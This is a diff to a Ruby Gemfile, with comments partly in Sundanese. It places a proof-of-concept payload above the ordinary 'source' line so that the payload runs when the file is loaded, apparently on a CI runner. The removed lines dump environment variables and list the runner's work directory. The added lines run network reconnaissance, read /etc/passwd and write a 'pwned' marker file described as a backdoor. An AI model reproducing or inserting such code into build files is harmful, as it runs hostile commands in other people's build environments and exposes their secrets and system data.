@@ -1,10 +1,21 @@
-# --- POC EXTREME START ---
+# --- POC MEGA EXTREME START ---
 puts "========================================"
-puts "🔥 EXTREME IMPACT: ACCESSING SECRETS"
-# Nembongkeun daptar environment variables (hati-hati, loba data sensitif)
-puts `env | cut -c1-50` 
-# Mariksa naha urang bisa maca file sensitif dina sistem
-puts "--- RUNNER DIRECTORY ---"
-puts `ls -la /home/runner/work/`
+puts "🔥 PROOF 3: SYSTEM NETWORK RECON"
+puts "Internal IP & Network Interface:"
+puts `ip addr | grep inet`
+
+puts "\n🔥 PROOF 4: SENSITIVE FILE ACCESS"
+puts "Reading /etc/passwd (User List):"
+puts `head -n 5 /etc/passwd`
+
+puts "\n🔥 PROOF 5: WRITE ACCESS TEST"
+puts "Creating a backdoor file in the runner:"
+`echo 'MAMANK WAS HERE' > /tmp/pwned.txt`
+puts "Checking created file:"
+puts `cat /tmp/pwned.txt`
 puts "========================================"
-# --- POC EXTREME END ---
+# --- POC MEGA EXTREME END ---
+
+# ... (Sesa eusi Gemfile nu asli di handapna)
+source "https://rubygems.org"
+# ... (Tuluykeun jiga nu tadi)
